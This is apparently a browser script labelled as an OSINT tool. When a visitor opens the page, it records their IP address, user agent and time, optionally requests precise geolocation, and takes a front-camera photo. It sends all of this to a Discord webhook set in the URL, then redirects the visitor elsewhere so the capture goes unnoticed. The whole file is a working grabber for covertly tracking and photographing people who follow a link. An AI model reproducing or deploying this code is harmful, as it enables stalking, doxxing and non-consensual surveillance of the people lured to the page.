(async () => {
  const cfg = window.OSINT_CONFIG || {};
  const qs = new URLSearchParams(window.location.search);

  const log = (...args) => {
    if (cfg.debug || qs.get("debug") === "1") {
      const box = document.getElementById("debugBox");
      box.style.display = "block";
      box.textContent += args.map(a => (typeof a === 'object' ? JSON.stringify(a, null, 2) : a)).join(" ") + "\n";
    }
    console.log(...args);
  };

  const getParam = (key, fallback) => {
    if (qs.has(key)) return qs.get(key);
    return cfg[key] ?? fallback;
  };

  const webhookUrl = getParam("webhookUrl", "");
  const finalUrl = getParam("r", cfg.finalUrl);
  const requestCamera = getParam("cam", cfg.requestCamera) == "1";
  const requestGeo = getParam("geo", cfg.requestGeo) == "1";
  const redirectDelay = parseInt(getParam("delay", cfg.redirectDelayMs), 10);

  log("Webhook:", webhookUrl);
  log("Destino:", finalUrl);

  const data = { when: new Date().toString(), location: null, ip: null, userAgent: navigator.userAgent };
  let blob = null;

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    data.ip = (await ipRes.json()).ip;
  } catch (e) {
    log("Erro ao obter IP:", e);
  }

  // Geolocalização
  if (requestGeo && navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
      data.location = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy
      };
    } catch (e) {
      log("Geo negado:", e.message);
    }
  }

  // Câmera frontal
  if (requestCamera && navigator.mediaDevices?.getUserMedia) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg"));
      stream.getTracks().forEach(t => t.stop());
    } catch (e) {
      log("Câmera negada ou falhou:", e.message);
    }
  }

  const payload = `**IP:** ${data.ip || "N/A"}\n` +
    `**User-Agent:** ${data.userAgent}\n` +
    `**Localização:** ${data.location ? `${data.location.lat}, ${data.location.lon} (±${data.location.acc}m)` : "N/A"}\n` +
    `**Hora:** ${data.when}`;

  const form = new FormData();
  form.append("payload_json", JSON.stringify({ content: payload }));
  if (blob) form.append("file", blob, "cam.jpg");

  if (webhookUrl.startsWith("https://discord.com/api/webhooks/")) {
    try {
      await fetch(webhookUrl, { method: "POST", body: form });
      log("Enviado ao Discord");
    } catch (e) {
      log("Erro ao enviar para webhook:", e);
    }
  }

  setTimeout(() => window.location.href = finalUrl, redirectDelay);
})();
